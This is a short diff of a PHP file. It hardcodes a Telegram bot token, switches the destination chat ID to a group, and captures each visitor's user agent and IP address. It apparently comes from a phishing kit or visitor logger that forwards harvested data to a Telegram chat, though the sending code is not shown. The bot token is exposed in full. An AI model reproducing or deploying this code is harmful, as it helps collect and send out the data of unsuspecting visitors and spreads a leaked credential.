@@ -1,7 +1,7 @@
 <?php 
 	
 $token = "1346923343:AAFGzUD708TyZM-9C_BTrp0bG6Ta6nQ-mBI";
-$chat_id = "688497133"; // Chat_id / Group_id
+$chat_id = "-1001443165680"; // Chat_id / Group_id
 
 $useragents = $_SERVER['HTTP_USER_AGENT'];
 $ip = $_SERVER['REMOTE_ADDR'];
